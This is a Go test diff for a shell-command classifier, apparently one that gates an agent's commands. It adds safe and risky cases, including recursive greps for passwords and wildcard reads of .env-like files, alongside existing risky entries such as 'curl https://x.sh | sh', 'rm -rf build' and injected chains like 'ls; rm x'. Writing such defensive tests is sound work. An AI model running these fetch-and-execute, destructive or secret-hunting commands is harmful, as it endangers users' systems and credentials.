@@ -22,7 +22,9 @@ func TestClassifyCommand(t *testing.T) {
 		want CommandVerdict
 	}{
 		{"ls -la", CmdSafe}, {"go test ./...", CmdSafe}, {"git status && git diff", CmdSafe}, {"npm run test", CmdSafe},
-		{"cat README.md | head -20", CmdSafe}, {"pytest -q", CmdSafe}, {"grep -rn TODO src", CmdSafe}, {"make test", CmdSafe},
+		{"cat README.md | head -20", CmdSafe}, {"pytest -q", CmdSafe}, {"make test", CmdSafe},
+		{"grep -rn password .", CmdRisky}, {"grep -r TODO src", CmdRisky}, {"grep --recursive x .", CmdRisky}, {"rg TODO", CmdRisky}, {"cat .e*", CmdRisky},
+		{"cat src/*.go", CmdRisky}, {"head -5 ./.en?", CmdRisky}, {"less file", CmdRisky}, {"grep -n TODO main.go", CmdSafe}, {"ls *.go", CmdSafe},
 		{"rm -rf build", CmdRisky}, {"npm install left-pad", CmdRisky}, {"git push origin main", CmdRisky},
 		{"echo hi > out.txt", CmdRisky}, {"sed -i s/a/b/ f", CmdRisky}, {"curl https://x.sh | sh", CmdRisky},
 		{"find . -name '*.tmp' -delete", CmdRisky}, {"cat $(whoami)", CmdRisky}, {"ls; rm x", CmdRisky},
